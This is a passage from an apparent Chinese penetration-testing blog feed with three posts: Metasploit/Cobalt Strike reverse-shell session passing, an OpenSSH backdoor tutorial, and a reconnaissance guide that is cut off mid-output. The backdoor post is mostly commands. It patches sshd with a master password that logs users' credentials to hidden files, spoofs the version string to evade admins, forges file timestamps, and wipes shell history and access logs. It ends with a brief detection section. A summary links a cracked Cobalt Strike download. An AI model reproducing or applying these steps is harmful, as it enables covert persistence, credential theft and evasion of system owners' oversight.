<li>msf未获得meterpreter的session，想直接让目标给cs上线<br>cs先开启监听者（见上文），此时msf的payload按照如下写法即可<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">set payload windows/meterpreter/reverse_http</div><div class="line">set lhost 192.168.31.29 # cs的服务端IP</div><div class="line">set lport 33890</div></pre></td></tr></table></figure>
</li>
</ul>
<p>就可以了，简单吧。这里其实就是payload选择reverse_http（注意32位的，不是64位的，这里大坑），然后监听的地址和端口写cs的监听者的信息就可以了，生成payload后怎么让目标执行就不在本文讨论范围了</p>
<ul>
<li>cs获得了一个上线机器，想把这个机器丢给msf中的meterpreter获得一个session进行控制<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/handler </div><div class="line">set payload windows/meterpreter/reverse_tcp # 再次强调大坑：不要用x64的payload！</div><div class="line">set lhost 192.168.31.29 </div><div class="line">set lport 9999</div><div class="line">exploit # 开启监听</div></pre></td></tr></table></figure>
</li>
</ul>
<p>cs中，对目标机器点击右键，spawn，新建一个监听者，payload选择foreign/reverse_tcp<br><img src="http://obh1qcqek.bkt.clouddn.com/17-12-17/53472037.jpg" alt=""><br>最后choose它就可以了，如果meterpreter没有马上获得shell，不要着急，因为cs中默认sleep是1分钟，你可以先提前把sleep改短些，这样cs的反应会快些。</p>
<ul>
<li>cs获得了一个上线机器，想把这个机器丢给msf中继续进行渗透<br>这里其实只需要cs开一个socks给msf用就行了，具体操作如下：<br>对上线机器点右键，开启socks4a，然后会给你一个地址，在msf中设置proxy即可</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;　　Cobalt Strike 一款以metasploit为基础的GUI的框架式渗透测试工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。Cobalt Strike主要用于团队作战，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。&lt;br&gt;　　&lt;a href=&quot;https://cobaltstrike.com/&quot;&gt;Cobalt Strike&lt;/a&gt;，据说现在最新版为3.9，主要分为试用版和付费版，试用版为21天，付费版3500美元，据说网上也有一些&lt;a href=&quot;http://www.cnblogs.com/haq5201314/p/7040832.html&quot;&gt;破解教程&lt;/a&gt;，&lt;a href=&quot;https://pan.baidu.com/s/1qYocNbm&quot;&gt;cobaltstrik3.6破解版下载&lt;/a&gt; 密码: 51tg。因为Cobalt Strike是美国对外限制型出口软件，只在美国和加拿大允许发售，所以我们需要google搜索下usa的个人代理来绕开限制。&lt;br&gt;
    
    </summary>
    
      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="工具" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Linux渗透之OpenSSH后门</title>
    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F/%E6%B5%8B%E8%AF%95/2017/09/26/Linux%E6%B8%97%E9%80%8F%E4%B9%8BOpenSSH%E5%90%8E%E9%97%A8.html"/>
    <id>http://yoursite.com/渗透/测试/2017/09/26/Linux渗透之OpenSSH后门.html</id>
    <published>2017-09-26T12:59:04.000Z</published>
    <updated>2017-10-25T15:28:41.188Z</updated>
    
    <content type="html"><![CDATA[<p>　　当我们拿到一个服务器的shell之后，肯定需要维持好我们的权限，这里我们需要留个后门方便我们进出。这里我们不讨论提权的问题，前提我们通过各种方式提权到root，拿到root之后才是我们留后门的开始。做了个openssh的后门，也就是root双密码，管理一个密码、我们的后门一个密码，不影响管理的那个密码。<br>　　这里我们讨论两个Linux，实验环境为Centos 7和Ubuntu 16.0.4</p>
<h3 id="0x01-查看版本"><a href="#0x01-查看版本" class="headerlink" title="0x01 查看版本"></a>0x01 查看版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -V</div></pre></td></tr></table></figure>
<a id="more"></a>
<p>Centos 7.0<br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/42766212.jpg" alt=""><br>Ubuntu 16.0.4<br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/78241917.jpg" alt=""><br>有必要的话需要对原ssh配置文件进行备份，可以对后期的文件时间进行修改：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cp -p /etc/ssh/ssh_config  / etc/ssh/ssh_config.bak</div><div class="line">cp -p /etc/ssh/sshd_config  / etc/ssh/sshd_config.bak</div></pre></td></tr></table></figure></p>
<h3 id="0x02-下载SSH配置文件"><a href="#0x02-下载SSH配置文件" class="headerlink" title="0x02 下载SSH配置文件"></a>0x02 下载SSH配置文件</h3><p><a href="http://ifuryst.com/usr/uploads/data/openssh-5.9p1.tar.gz" target="_blank" rel="external">openssh-5.9p1.tar.gz</a><br><a href="http://ifuryst.com/usr/uploads/data/openssh-5.9p1.patch.tar.gz" target="_blank" rel="external">openssh-5.9p1.patch.tar.gz</a><br>　　使用wget进行远程下载，如果没有安装wget，可以安装可以直接下载openssh源码，也可以使用菜刀大马等上传上去。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Centos:yum -y install wget</div><div class="line">Ubuntu:apt-get install wget</div></pre></td></tr></table></figure></p>
<h3 id="0x03-编辑安装"><a href="#0x03-编辑安装" class="headerlink" title="0x03 编辑安装"></a>0x03 编辑安装</h3><p>Centos 7<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">tar zxvf openssh-5.9p1.tar.gz</div><div class="line">tar zxvf openssh-5.9p1.patch.tar.gz</div><div class="line">cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1/   复制patch后门文件到正常openssh里面</div><div class="line">patch &lt; sshbd5.9p1.diff</div></pre></td></tr></table></figure></p>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/4576919.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/76087726.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/66109180.jpg" alt=""><br>可能遇到的问题patch未安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum -y install patch</div></pre></td></tr></table></figure></p>
<p>Ubuntu 16.0.4<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install openssh-server   #安装SSH</div><div class="line">sudo service ssh start</div><div class="line"></div><div class="line">vim /etc/ssh/sshd_config #设置root连接ssh</div><div class="line"></div><div class="line">#Authentication:</div><div class="line">LoginGraceTime 120</div><div class="line">PermitRootLogin prohibit-password</div><div class="line">StrictModes yes</div><div class="line">改成</div><div class="line">#Authentication:</div><div class="line">LoginGraceTime 120</div><div class="line">PermitRootLogin yes</div><div class="line">StrictModes yes</div><div class="line"></div><div class="line">/etc/init.d/ssh restart   #重启</div></pre></td></tr></table></figure></p>
<p>　　编辑安装Centos 7和Ubuntu 16.0.4过程一样，就不过多介绍了。</p>
<h3 id="0x04-修改后门密码和文件记录"><a href="#0x04-修改后门密码和文件记录" class="headerlink" title="0x04 修改后门密码和文件记录"></a>0x04 修改后门密码和文件记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@localhost openssh-5.9p1# vim includes.h</div><div class="line">int secret_ok;</div><div class="line">FILE *f;</div><div class="line">#define ILOG &quot;/tmp/ilog&quot;  # 记录登录到本机的用户名和密码</div><div class="line">#define OLOG &quot;/tmp/olog&quot;  # 记录本机登录到远程的用户名和密码</div><div class="line">#define SECRETPW &quot;warden&quot; # 远程连接密码</div><div class="line">#endif /* INCLUDES_H */</div></pre></td></tr></table></figure>
<p>　　可以对后门密码和记录文件进行修改，在文件前面加上.相当于是隐藏文件，也可以换个隐蔽的目录。修改之后的<br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/1960037.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@localhost openssh-5.9p1# vim version.h</div><div class="line">/* $OpenBSD: version.h,v 1.62 2011/08/02 23:13:01 djm Exp $ */</div><div class="line">#define SSH_VERSION &quot;OpenSSH_5.3p1&quot;</div><div class="line">#define SSH_PORTABLE &quot;p1&quot;</div><div class="line">#define SSH_RELEASE SSH_VERSION SSH_PORTABLE</div></pre></td></tr></table></figure></p>
<p>　　可以根据我们刚才的查看的版本信息进行修改，使其版本一致不易被管理员发现和察觉。</p>
<h3 id="0x05-编译安装"><a href="#0x05-编译安装" class="headerlink" title="0x05 编译安装"></a>0x05 编译安装</h3><p>Centos 7<br>首先对ssh里面的几个key的权限进行修改，否则可能进行编译的时候key不能修改而报错。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">chmod 620 moduli</div><div class="line">chmod 600 sshd_config ssh_host_ecdsa_key ssh_host_rsa_key</div><div class="line">chmod 644 ssh_config ssh_host_ecdsa_key.pub ssh_host_rsa_key.pub</div></pre></td></tr></table></figure></p>
<p>安装环境编译运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">yum install -y openssl openssl-devel pam-devel zlib zlib-devel</div><div class="line">./configure --prefix=/usr/ --sysconfdir=/etc/ssh/ --with-pam --with-kerberos5</div><div class="line">make clean</div><div class="line">make &amp;&amp; make install</div><div class="line">systemctl restart sshd.service</div></pre></td></tr></table></figure></p>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/45803683.jpg" alt=""><br>　　可以看到我们已经编译成功，我们的OpenSSH后门已经设置成功。使用我们的后门密码可以正常登陆，以前的密码也有记录，实验成功。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/42590305.jpg" alt=""></p>
<p>Ubuntu 16.04</p>
<p>安装环境编译运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">apt-get install -y openssl libssl-dev libpam0g-dev</div><div class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam</div><div class="line">make clean</div><div class="line">make &amp;&amp; make install</div><div class="line">/etc/init.d/ssh restart</div></pre></td></tr></table></figure></p>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/58021783.jpg" alt=""><br>　　可以看到我们已经编译成功，我们的OpenSSH后门已经设置成功。使用我们的后门密码可以正常登陆，以前的密码也有记录，实验成功。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/59095904.jpg" alt=""></p>
<h3 id="0x06-系统优化"><a href="#0x06-系统优化" class="headerlink" title="0x06 系统优化"></a>0x06 系统优化</h3><p>　　恢复新配置文件的日期跟旧文件日期一致对ssh_config和sshd_config新旧文件进行内容对比，使其配置文件一致，然后在修改文件日期。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">touch -r/etc/ssh/ssh_config.old /etc/ssh/ssh_config</div><div class="line">touch -r/etc/ssh/sshd_config.old /etc/ssh/sshd_config</div></pre></td></tr></table></figure></p>
<p>清除操作日志<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">export HISTFILE=/dev/null</div><div class="line">export HISTSIZE=0</div><div class="line">cd /etc/httpd/logs/</div><div class="line">sed -i ‘/192.168.52.175/d’ access_log*</div><div class="line">echo &gt;/root/.bash_history //清空操作日志</div></pre></td></tr></table></figure></p>
<h3 id="0x07-修复方案与应急响应"><a href="#0x07-修复方案与应急响应" class="headerlink" title="0x07 修复方案与应急响应"></a>0x07 修复方案与应急响应</h3><p>1）重装openssh软件<br>2）SSH禁止对外开放</p>
<p>应急响应：<br>1）比对ssh的版本<br>ssh -V<br>2）查看ssh配置文件和/usr/sbin/sshd的时间<br>stat /usr/sbin/sshd<br>3）strings检查/usr/sbin/sshd，看是否有邮箱信息<br>strings可以查看二进制文件中的字符串，在应急响应中是十分有用的。有些sshd后门会通过邮件发送登录信息，通过strings /usr/sbin/sshd可以查看到邮箱信息。<br>4）通过strace监控sshd进程读写文件的操作<br>一般的sshd后门都会将账户密码记录到文件，可以通过strace进程跟踪到ssh登录密码文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">ps axu | grep sshd | grep -v grep</div><div class="line">root 65530 0.0 0.1 48428 1260 ? Ss 13:43 0:00 /usr/sbin/sshd</div><div class="line">strace -o aa -ff -p 65530</div><div class="line">grep open aa* | grep -v -e No -e null -e denied| grep WR</div><div class="line">aa.102586:open(&quot;/tmp/ilog&quot;, O_WRONLY|O_CREAT|O_APPEND, 0666) = 4</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;　　当我们拿到一个服务器的shell之后，肯定需要维持好我们的权限，这里我们需要留个后门方便我们进出。这里我们不讨论提权的问题，前提我们通过各种方式提权到root，拿到root之后才是我们留后门的开始。做了个openssh的后门，也就是root双密码，管理一个密码、我们的后门一个密码，不影响管理的那个密码。&lt;br&gt;　　这里我们讨论两个Linux，实验环境为Centos 7和Ubuntu 16.0.4&lt;/p&gt;
&lt;h3 id=&quot;0x01-查看版本&quot;&gt;&lt;a href=&quot;#0x01-查看版本&quot; class=&quot;headerlink&quot; title=&quot;0x01 查看版本&quot;&gt;&lt;/a&gt;0x01 查看版本&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;ssh -V&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
      <category term="测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="后门" scheme="http://yoursite.com/tags/%E5%90%8E%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试--01信息搜集</title>
    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F/2017/08/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-01%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.html"/>
    <id>http://yoursite.com/渗透/2017/08/03/渗透测试-01信息搜集.html</id>
    <published>2017-08-03T04:06:17.000Z</published>
    <updated>2017-08-03T08:34:38.632Z</updated>
    
    <content type="html"><![CDATA[<p>　　信息搜集是渗透目标的最重要的阶段，占据整个渗透测试的60%，可见信息搜集的重要性。根据收集的有用信息，可以大大提高我们渗透测试的成功率。</p>
<h2 id="0x01-搜索引擎"><a href="#0x01-搜索引擎" class="headerlink" title="0x01 搜索引擎"></a>0x01 搜索引擎</h2><p>Google、Bing、ZoomEye（钟馗之眼）、Shodan（撒旦）</p>
<ul>
<li><p>Google hacking<a id="more"></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">intext: 把网页中的正文内容中的某个字符做为搜索条件;</div><div class="line">allintext:使用方法和intext类似;</div><div class="line">intitle: 搜索网页标题中是否有我们所要找的字符; </div><div class="line">cache: 搜索GOOGLE里关于某些内容的缓存,有时候往往能找到一些好东西. </div><div class="line">define: 搜索某个词的定义;</div><div class="line">filetype: 搜索制定类型的文件;</div><div class="line">info: 查找指定站点的一些基本信息;</div><div class="line">inurl: 搜索我们指定的字符是否存在于URL中.常用于查找通用漏洞、注入点、管理员登录的URL;</div><div class="line">allinurl:也同INURL类似,可指定多个字符;</div><div class="line">LINKURL: 例如搜索:INURL:HDU.EDU.CN可以返回所有和HDU.EDU.CN做了链接的URL;</div><div class="line">site: 搜索指定域名,用于搜集二级域名;</div><div class="line"></div><div class="line">一些连接符</div><div class="line"></div><div class="line">+ 把GOOGLE可能忽略的字列如查询范围 </div><div class="line">– 把某个字忽略 </div><div class="line">~ 同意词 </div><div class="line">. 单一的通配符 </div><div class="line">* 通配符，可代表多个字母 </div><div class="line">“” 精确查询</div></pre></td></tr></table></figure>
</li>
<li><p>Google域名<br>　　不同地区的 Google 搜索的不同，这种搜索引擎为了向大众提供方便根据不同的地域进行不同的优化。我们可以使用不同地区进行搜索，可能获取一些特别的信息。例如：<br>　　www.google.com.tw<br>　　www.google.com.hk<br>　　www.google.com.jp<br><strong>常见国际域名缩写</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">国际域名缩写	国家或地区	Countries and Regions</div><div class="line">CN	中国	China</div><div class="line">HK	香港特别行政区	Hongkong</div><div class="line">MO	澳门	Macao</div><div class="line">TW	台湾省	Taiwan</div><div class="line">KP	朝鲜	North Korea</div><div class="line">KR	韩国	Korea</div><div class="line">JP	日本	Japan</div><div class="line">RU	俄罗斯	Russia</div><div class="line">SG	新加坡	Singapore</div><div class="line">FR	法国	France</div><div class="line">CA	加拿大	Canada</div><div class="line">AU	澳大利亚	Australia</div><div class="line">US	美国	United States of America</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="0x02-whois查点"><a href="#0x02-whois查点" class="headerlink" title="0x02 whois查点"></a>0x02 whois查点</h2><p>　　whois信息包含了域名注册者的姓名、邮箱、电话、地址、DNS服务器等信息，对我们渗透目标以后后序的社工都很有用。</p>
<ul>
<li>KALI的whois查询<br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/68826948.jpg" alt=""></li>
<li>在线查询：<br><a href="https://www.whois.com/" target="_blank" rel="external">https://www.whois.com/</a><br><a href="http://whois.chinaz.com/reverse/" target="_blank" rel="external">http://whois.chinaz.com/reverse/</a><br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/30726785.jpg" alt=""></li>
<li>whois反查<br>利用注册人、邮箱、电话等进行whois反查，也可以搜集到一些意想不到的信息。<br><a href="http://whois.chinaz.com/reverse" target="_blank" rel="external">http://whois.chinaz.com/reverse</a></li>
</ul>
<h2 id="0x03-目标IP"><a href="#0x03-目标IP" class="headerlink" title="0x03 目标IP"></a>0x03 目标IP</h2><p>　　现在大部分网站都采用了CDN加速，其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定，为用户提供更流畅的服务。可是对于我们渗透测试人员来说，对判断目标IP带来阻碍。绕过CDN获取真实IP：</p>
<ul>
<li>判断：在不同地区ping网址<br><a href="http://ping.chinaz.com/" target="_blank" rel="external">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/" target="_blank" rel="external">http://ping.aizhan.com/</a><br><a href="http://tools.fastweb.com.cn/Index/Ping" target="_blank" rel="external">http://tools.fastweb.com.cn/Index/Ping</a><br>kaili下：dnsenum<br>eg：dnsenum -o /root/baidu.com -t 30 –threads 30 baidu.com</li>
<li>查找真实ip<br>1、二级域名法<br>　　一般网站不会所有的二级域名放CDN，可以使用谷歌语法site:xxxx.com查找二级域名，或者在线<a href="http://i.links.cn/subdomain/查找。" target="_blank" rel="external">http://i.links.cn/subdomain/查找。</a><br>　　确定没有使用CDN得二级域名之后，本地将目标域名绑定到同IP（修改hosts文件），如果目标网站还能访问说明目标网站与二级域名在同一服务器上；如果不在统一服务器也可能在同C段，扫描C段所有开放80端口IP。<br>2、nslookup<br>　　大部分CDN提供商只针对国内市场，而国外的市场几乎不做CDN，所以有机会解析到真实IP。所以可以使用国外的VPS ping目标网址，或者使用nslookup <a href="http://xxx.com" target="_blank" rel="external">http://xxx.com</a> 国外DNS，例如：nslookup www.baidu.com 8.8.8.8，国外DNS最好找一些冷门的提供商。<br>　　或者查询域名的NS记录，在域名记录中的MX记录，TXT记录等很有可能指向的是真实ip或同C段服务器。<br>3、ping<br>　　很多厂商只是把www.xxx.com做了CDN，我们可以使用ping <a href="http://www.xxx.com，或者使用国外多节点ping在线工具，例如[just-ping](http://www.just-ping.com" target="_blank" rel="external">http://www.xxx.com，或者使用国外多节点ping在线工具，例如[just-ping](http://www.just-ping.com</a>)<br>4、查看历史记录<br>　　查找域名历史解析记录，域名在上CDN之前用的IP，很有可能就是CDN的真实源IP地址<a href="http://toolbar.netcraft.com/site_report" target="_blank" rel="external">http://toolbar.netcraft.com/site_report</a><br>5、利用网站漏洞<br>XSS盲打、命令执行反弹shell、SSRF等<br>6、其他<br>RSS订阅：通过RSS订阅的方式，可以查找到订阅的消息中真实IP<br>订阅邮件：打开发来的邮件源码，可以看到服务器的真实IP，有时候会在同一网段，扫扫C段。<br>phpinfo：这个是最直接的，使用目录扫描，关键在于你的字典是否强大。</li>
</ul>
<h2 id="0x04-指纹识别"><a href="#0x04-指纹识别" class="headerlink" title="0x04 指纹识别"></a>0x04 指纹识别</h2><ul>
<li>whatweb<br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/43361731.jpg" alt=""></li>
<li>Wappalyzer、Shodan、IP Whois &amp; Flags Chrome &amp; Websites Rating<br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/9882144.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/35679591.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/63954749.jpg" alt=""></li>
<li>nmap<br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/41569206.jpg" alt=""></li>
<li>TCP/IP属性：TTL、Window Size、DF<br>　　TTL：生存时间。指定数据报被路由器丢弃之前允许通过的网段数量。TTL 是由发送主机设置的，以防止数据包不断在 IP 互联网络上永不终止地循环。数据包在传送的时候至少会经过一个以上的路由器，当数据包经过一个路由器的时候，TTL就会自动减1，如果减到0了还是没有传送到目的主机，那么这个数据包就会自动丢失，这时路由器会发送一个ICMP报文给最初的发送者。<br><strong>ping直接查看TTL</strong><br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/59779587.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/30086518.jpg" alt=""><br>　　可以看到TTL为54，路由追踪发现经过10跳到达目的，很有可能是Liunx系统，虽然这种方法可能存在偏差。<br><strong>telent</strong><br>使用telent进行连接，使用Snort进行监听，查看三个属性，在siphon指纹数据库文件osprints.conf进行对比<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">WINDOWS NT/2000   TTL：128</div><div class="line">WINDOWS 95/98     TTL：32</div><div class="line">UNIX              TTL：255</div><div class="line">LINUX             TTL：64</div><div class="line">WIN7          TTL：64</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="0x05-WAF检测"><a href="#0x05-WAF检测" class="headerlink" title="0x05 WAF检测"></a>0x05 WAF检测</h2><ul>
<li>WafW00f<br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/9339095.jpg" alt=""></li>
<li>nmap<br>nmap www.baidu.com –script=http-waf-detect<br>或者–script=firewalk –traceroute、–script=http-waf-fingerprint<br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/85651442.jpg" alt=""></li>
</ul>
<h2 id="0x06-端口扫描"><a href="#0x06-端口扫描" class="headerlink" title="0x06 端口扫描"></a>0x06 端口扫描</h2><p>老生常谈的端口扫描，以及常用方法大家也都明白。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/82233595.jpg" alt=""><br>nmap<br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/40502374.jpg" alt=""></p>
<h2 id="0x07-DNS查询"><a href="#0x07-DNS查询" class="headerlink" title="0x07 DNS查询"></a>0x07 DNS查询</h2><p>　　DNS（域名系统）可以在侦查过程中提供有价值的数据，DNS的基本功能是将域名转换为IP地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">DNS记录：</div><div class="line">AAAA记录    IPv6 地址记录，记录一个域名对应的IPv6地址</div><div class="line">CNAME记录   别名记录，记录一个主机的别名</div><div class="line">MX记录    电子邮件交换记录，记录一个邮件域名对应的IP地址</div><div class="line">NS记录      域名服务器记录 ,记录该域名由哪台域名服务器解析</div><div class="line">PTR记录     反向记录，也即从IP地址到域名的一条记录</div><div class="line">TXT记录     记录域名的相关文本信息</div></pre></td></tr></table></figure></p>
<ul>
<li>host<br>host -t ns  www.baidu.com<br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/88130402.jpg" alt=""></li>
<li>nslookup<br>Nslookup命令以两种方式运行:非交互式和交互式。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&gt; nslookup</div><div class="line">默认服务器:  UnKnown</div><div class="line">Address:  192.168.43.1</div><div class="line"></div><div class="line">&gt; ?</div><div class="line">命令:   (标识符以大写表示，[] 表示可选)</div><div class="line">set OPTION      - 设置选项</div><div class="line">    domain=NAME         - 将默认域名设置为 NAME</div><div class="line">    srchlist=N1[/N2/.../N6] - 将域设置为 N1，并将搜索列表设置为 N1、N2 等</div><div class="line">    root=NAME           - 将根服务器设置为 NAME</div><div class="line">    retry=X             - 将重试次数设置为 X</div><div class="line">    timeout=X           - 将初始超时间隔设置为 X 秒</div><div class="line">    type=X              - 设置查询类型(如 A、AAAA、A+AAAA、ANY、CNAME、MX、</div><div class="line">                          NS、PTR、SOA 和 SRV)</div><div class="line">ls [opt] DOMAIN [&gt; FILE] - 列出 DOMAIN 中的地址(可选: 输出到文件 FILE)</div><div class="line">    -a          -  列出规范名称和别名</div><div class="line">    -d          -  列出所有记录</div><div class="line">    -t TYPE     -  列出给定 RFC 记录类型(例如 A、CNAME、MX、NS 和 PTR 等)</div><div class="line">                   的记录</div><div class="line">exit            - 退出程序</div></pre></td></tr></table></figure>
<p>根据DNS查询，我们可以查找到DNS服务器、邮件服务器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">&gt; nslookup</div><div class="line">默认服务器:  UnKnown</div><div class="line">Address:  192.168.43.1</div><div class="line">&gt; set type=mx</div><div class="line">&gt; baidu.com</div><div class="line">服务器:  UnKnown</div><div class="line">Address:  192.168.43.1</div><div class="line"></div><div class="line">非权威应答:</div><div class="line">baidu.com       MX preference = 20, mail exchanger = mx1.baidu.com</div><div class="line">baidu.com       MX preference = 10, mail exchanger = mx.n.shifen.com</div><div class="line">baidu.com       MX preference = 20, mail exchanger = jpmx.baidu.com</div><div class="line">baidu.com       MX preference = 20, mail exchanger = mx50.baidu.com</div><div class="line"></div><div class="line">baidu.com       nameserver = ns7.baidu.com</div><div class="line">baidu.com       nameserver = 